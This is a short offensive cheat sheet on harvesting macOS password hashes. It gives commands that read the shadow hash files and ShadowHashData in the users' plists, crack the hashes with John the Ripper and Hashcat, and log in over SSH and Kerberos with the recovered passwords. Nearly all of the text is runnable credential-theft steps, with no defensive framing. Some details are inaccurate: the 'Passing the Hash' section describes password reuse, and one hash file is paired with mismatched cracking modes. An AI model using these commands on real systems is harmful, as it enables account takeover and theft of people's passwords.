### **Extracting Hashes on macOS**

#### **For macOS Versions 10.5 - 10.7**

1. **Extract User's GUID:**
   - Command:
     ```bash
     dscl localhost -read /Search/Users/<userne> | grep GeneratedUID | cut -c15-
     ```
   - **Use Case:** Retrieves the GUID (Globally Unique Identifier) of the specified user.

2. **Extract the User Hash:**
   - Command:
     ```bash
     cat /var/db/shadow/hash/<GUID> | cut -c169-216 > osx_hash.txt
     ```
   - **Use Case:** Extracts the hash from the shadow file associated with the user's GUID and saves it to `osx_hash.txt`.

---

#### **For macOS Versions 10.8 - 10.12**

1. **Extract Hash in Readable Format:**
   - Command:
     ```bash
     sudo defaults read /var/db/dslocal/nodes/Default/users/<userne>.plist ShadowHashData | tr -dc '0-9a-f' | xxd -p -r | plutil -convert xml1 - -o -
     ```
   - **Use Case:** Extracts the user's hash from the plist file in a readable format.

---

### **Hash Cracking**

After extracting the hashes, you can use common cracking tools to attempt password recovery.

1. **John the Ripper:**
   - Command:
     ```bash
     john --format=raw-sha1 osx_hash.txt --wordlist=/path/to/wordlist.txt
     ```
   - **Use Case:** Attempts to crack the macOS hash using a specified wordlist.

2. **Hashcat:**
   - Command:
     ```bash
     hashcat -m 7100 osx_hash.txt /path/to/wordlist.txt
     ```
   - **Use Case:** Uses Hashcat to crack macOS hashes, where `-m 7100` specifies the hash mode for macOS.

---

### **Passing the Hash**

Passing the hash in macOS environments is less straightforward compared to Windows. However, once a password is cracked, it can be used directly to authenticate to services, depending on the configuration of the macOS or integrated systems.

1. **SSH Authentication (Example):**
   - If you have obtained the plaintext password:
     ```bash
     ssh <userne>@<target-ip>
     ```
   - **Use Case:** Authenticate via SSH using the cracked password.

2. **Kerberos Authentication:**
   - If Kerberos is in use, you can use the cracked password to generate a Kerberos ticket for authentication to services.

   - **Example:**
     ```bash
     kinit <userne>
     ```
   - **Use Case:** Generate a Kerberos ticket using the cracked password for the user.

---

### **Locations of Hashes on macOS**

- **/var/db/shadow/hash/:** Location where older macOS versions store user hashes, identified by GUID.
- **/var/db/dslocal/nodes/Default/users/:** Location where macOS stores plist files containing user information, including hashes for newer macOS versions.

---
